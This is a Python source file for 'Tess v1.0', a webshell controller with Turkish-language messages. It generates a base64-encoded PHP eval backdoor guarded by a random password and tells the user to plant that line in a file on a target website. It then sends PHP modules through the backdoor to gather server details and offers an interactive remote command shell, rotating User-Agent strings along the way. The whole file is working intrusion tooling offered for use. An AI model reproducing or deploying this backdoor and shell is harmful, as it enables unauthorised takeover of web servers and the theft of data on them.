from rich.console import Console
import requests, os, random
import base64
from sys import exit
from rich.prompt import Confirm
from json import loads

agents = requests.get("https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt").text.splitlines()

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def confirm(message):
    return Confirm.ask(f"[bright_white][[medium_purple1]?[bright_white]] {message}")

def ask(message):
    console.print(f"[bright_white][[medium_purple1]?[bright_white]] {message}", end="")
    return input()

def error(message):
    console.print(f"[bright_white][[red3]![bright_white]] {message}")

def success(message):
    console.print(f"[bright_white][[light_green]+[bright_white]] {message}")

def info(message):
    console.print(f"[bright_white][[cyan1]*[bright_white]] {message}")

def sunucu_bilgi(data):
    console.print("""
{0}[{1}+{0}] Uname       : {2}
{0}[{1}+{0}] User        : {3}
{0}[{1}+{0}] PHP version : {4}
{0}[{1}+{0}] Safe Mode   : {5}
{0}[{1}+{0}] IP          : {6}
{0}[{1}+{0}] DateTime    : {7}
{0}[{1}+{0}] Software    : {8}
{0}[{1}+{0}] PWD         : {9}
    """.format(
        "[bright_white]", "[light_green]", data["uname"],
        data["user"], data["version"], data["safe_mode"],
        data["ip"], data["date"], data["software"], data["pwd"]
    ))

def kod_cek(dosya):
    ekmek = open("moduller/" + dosya, "r")
    tazeEkmek = ekmek.read()
    ekmek.close()
    return str(tazeEkmek)

def request(URL, PASS, KOD):
    try:
        source = requests.post(URL, data={
            PASS: KOD
        }, headers={
            "User-Agent": random.choice(agents)
            }
        , timeout=12)
    except KeyboardInterrupt:
        error("CTRL + C kombinasyonu ile programdan çıkış yapıldı.")
        exit(1)
    except:
        error("Site'ye bağlanılamıyor!")
        info("Güvenlik duvarı araya girmiş veya site çökmüş olabilir.")
        return 0, ""

    return 1, source

def shell(URL, PASS):
    KOMUT = kod_cek("komut_calistir.php")
    KOD = kod_cek("sunucu_bilgi.php")
    
    data = ""
    try:
        durum, kaynak = request(URL, PASS, KOD)
        if durum != 0:
            data = loads(kaynak.text)
    except ValueError:
        error("Site'ye bağlanılamıyor!")
        info("Güvenlik duvarı araya girmiş veya php kodunu eklememiş olabilirsiniz.\n")
        exit(1)

    if len(str(data).strip()) == 0:
        error("Web site bir yanıt göndermedi!")
        exit(1)

    sunucu_bilgi(data)

    pwd = data["pwd"]
    while True:
        console.print(f"[bright_white]Tess([purple4]{str(pwd)}[bright_white]) [deep_pink4]>>[bright_white] ", end="")
        try:
            command = input()
        except KeyboardInterrupt:
            error("CTRL + C kombinasyonu ile programdan çıkış yapıldı.")
            break

        if command == "clear" or command == "cls":
            clear()

        elif command == "exit" or command == "quit":
            break

        elif command == "pwd":
            console.print("\n" + pwd + "\n")

        elif "cd" in command.split() and command.split()[0] == "cd":
            dizin = command.replace("cd ", "")
            if dizin.startswith("/"):
                pwd = dizin
            elif dizin == "..":
                d = pwd.split("/")[:-1]
                d 
                pwd = ""
                for i in d:
                    if i.strip() == "":
                        continue
                    pwd+="/"+i
            elif dizin == ".":
                pass
            else:
                pwd += "/" + dizin
            if "//" in pwd:
                pwd = pwd.replace("//", "/")

        else:
            if "ls" in command.split() and "/" not in command:
                command = command + " " + pwd

            durum, kaynak = request(URL, PASS, KOMUT.replace("_COMMAND", command))
            if durum != 0:
                console.print("\n" + kaynak.text)
                file = open("out.txt", "w", encoding="latin1")
                file.write(kaynak.text)
                file.close()

def php_kod_olusturucu():
    password = ""
    for _ in range(15):
        password+= random.choice(list("qwerttttyyuopasdfghjklizxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"))

    return base64.b64decode(
        "PD9waHAgZXZhbCgkX1BPU1RbInBhc3N3b3JkIl0pOyA/Pg=="
    ).decode('utf-8').replace(
        "password", password
    ), password

def main():
    console.print("""
{0}[{1}+{0}] Coded by Will Graham // github.com/cannibal-hannibal/Tess
{0}[{1}+{0}] Tess v1.0 - webshell
    """.format("[bright_white]","[light_green]"))

    ch = confirm("Yeni bir php kodu oluşturmak ister misiniz?")
    if ch:
        PHP, PASS = php_kod_olusturucu()
        info("Bu php kodunu sitede bir dosya'ya ekleyin:[purple4] " + PHP)
        info("Yeni şifreniz: [purple4]" + PASS)
    else:
        PASS = ask("Dosya'nın şifresini giriniz: ")
    URL = ask("Dosya'nın bulunduğu url adresi: ")
    shell(URL, PASS)

if __name__ == "__main__":
    try:
        console = Console()
        main()
    except KeyboardInterrupt:
        error("CTRL + C kombinasyonu ile programdan çıkış yapıldı.")
        exit(1)